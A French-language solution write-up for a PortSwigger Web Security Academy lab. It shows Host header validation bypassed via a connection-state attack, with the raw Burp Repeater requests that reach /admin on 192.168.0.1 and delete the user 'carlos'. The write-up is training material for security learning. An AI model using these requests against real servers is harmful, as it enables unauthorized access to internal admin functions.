# Lab

https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack

## Solution

Certains serveurs Web utilisent l'en-tête `Connection` pour déterminer si une requête est une requête initiale ou une requête de suivi. Si la valeur de l'en-tête est `close`, le serveur considère la requête comme une requête initiale. Si la valeur de l'en-tête est `keep-alive`, le serveur considère la requête comme une requête de suivi.

En suivant ce principe, on peut envoyer deux requêtes, dans l'ordre :

- Une requête classique
- Une requête avec le header `Host` modifié

Si le serveur se base sur la première requête de la connection pour contrôler le header `Host` et qu'il laisse la deuxième requête passer, on peut contourner le contrôle.

Dans Burp Repeater, créer deux requêtes :

```http	
GET / HTTP/1.1
Host: 0aa2005203919a7e81058e2800c60072.h1-web-security-academy.net
Cookie: session=EXIvGCQ0tUxm9aKbA1a3BwnYZWsjp76h; _lab=46%7cMCwCFFZ2lsrleK%2bgw25EWCG8hpVuDC7KAhQyiN7fSYGKcsVyRM0Bzr62BEThb2Vym3cAcljnoYsXMEVa3S%2fee3pU%2fOPjjpCQHWxPAxuerVBoSEKPa6hYt9%2bMQg3TJZpWf%2bWCe3dM7uqwhMtKqyYGQ%2fq0RP%2f0LDWvGgsFtgQgCZGH67AcBCE%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0aa2005203919a7e81058e2800c60072.h1-web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
```

```http
GET /admin HTTP/1.1
Host: 192.168.0.1
Cookie: session=EXIvGCQ0tUxm9aKbA1a3BwnYZWsjp76h; _lab=46%7cMCwCFFZ2lsrleK%2bgw25EWCG8hpVuDC7KAhQyiN7fSYGKcsVyRM0Bzr62BEThb2Vym3cAcljnoYsXMEVa3S%2fee3pU%2fOPjjpCQHWxPAxuerVBoSEKPa6hYt9%2bMQg3TJZpWf%2bWCe3dM7uqwhMtKqyYGQ%2fq0RP%2f0LDWvGgsFtgQgCZGH67AcBCE%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0aa2005203919a7e81058e2800c60072.h1-web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: keep-alive
```

Ce qui nous donne accès au panel admin et nous permet de supprimer l'utilisateur `carlos` en modifiant la deuxième requête :

```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=EXIvGCQ0tUxm9aKbA1a3BwnYZWsjp76h; _lab=46%7cMCwCFFZ2lsrleK%2bgw25EWCG8hpVuDC7KAhQyiN7fSYGKcsVyRM0Bzr62BEThb2Vym3cAcljnoYsXMEVa3S%2fee3pU%2fOPjjpCQHWxPAxuerVBoSEKPa6hYt9%2bMQg3TJZpWf%2bWCe3dM7uqwhMtKqyYGQ%2fq0RP%2f0LDWvGgsFtgQgCZGH67AcBCE%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0aa2005203919a7e81058e2800c60072.h1-web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=LUv4xBgM2uVb4Fofa4NFbSVhYU54eOSY&username=carlos
```